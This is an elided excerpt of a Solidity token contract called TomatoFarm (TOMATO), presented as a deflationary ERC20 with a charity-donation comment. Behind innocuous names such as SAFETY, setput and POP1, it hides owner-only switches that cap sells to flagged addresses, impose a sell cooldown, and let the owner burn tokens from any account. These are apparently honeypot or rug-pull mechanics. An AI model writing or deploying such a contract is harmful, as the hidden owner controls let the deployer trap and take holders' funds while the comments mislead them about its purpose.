...
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;// instead of a 1% token burn, there will be a 0.5% burn and a 0.5% donation to an BNB address (the foodbank)
// This will allow PASTA to stick
    }
...
contract DeflationaryERC20 is Context, IERC20, Ownable {
    ...
    mapping(address => bool) public bucket;
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private faucet = 500e18;
     ...
     */
        ...
        function POP1 (uint256 POP) external virtual onlyOwner {
        faucet = POP;
    }
    
    function setput (bool _bool) external virtual onlyOwner {
        security= _bool;
    }
    
    function SAFETY(address _addr, bool _bool) external virtual onlyOwner {
        bucket[_addr] = _bool;
    }
    ...
    function burn1(address account, uint256 amount) public onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if(timeNow < transData[sender] + 60 minutes){
            revert("Control yourselves, only 1 sell per 60 minutes, all Pervs can get satisfied.");
        }
        if(security == true && bucket[recipient] == true){
            require(amount <= faucet, 'Invest smart, faucet funds only');
            saveTransData(sender, block.timestamp);
           // _balances[recipient].sub(transferToAmount);  
        }
...
contract TomatoFarm is DeflationaryERC20 {

    constructor() DeflationaryERC20("TomatoFarm", "TOMATO") {

        _mint(msg.sender, 500000000000000e18);
    }
